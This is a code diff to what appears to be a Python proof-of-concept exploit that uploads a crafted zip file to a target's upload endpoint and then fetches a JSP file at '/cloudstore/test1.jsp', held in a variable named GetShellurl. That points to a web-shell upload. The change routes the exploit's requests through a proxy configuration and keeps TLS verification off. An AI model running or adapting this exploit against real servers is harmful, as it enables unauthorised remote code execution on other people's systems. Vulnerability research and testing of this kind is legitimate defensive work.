@@ -4,9 +4,10 @@
 import zipfile
 import io
 import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from Config.config_proxies import proxies
+
+requests.packages.urllib3.disable_warnings()
 
 
 # 脚本信息
@@ -50,7 +51,7 @@ def poc(target,exp=None):
         mem_string = exp_zip()
         GetShellurl = target + '/cloudstore/test1.jsp'
     file = [('file1', ('test.zip', mem_string.read(), 'application/zip'))]
-    requests.post(url=target_url,files=file,timeout=5, verify=False)
+    requests.post(url=target_url,files=file,timeout=5, verify=False,proxies=proxies)
     shell_res = requests.get(url = GetShellurl)
     GetShell_res = shell_res.text
     GetShell_res_code = shell_res.status_code
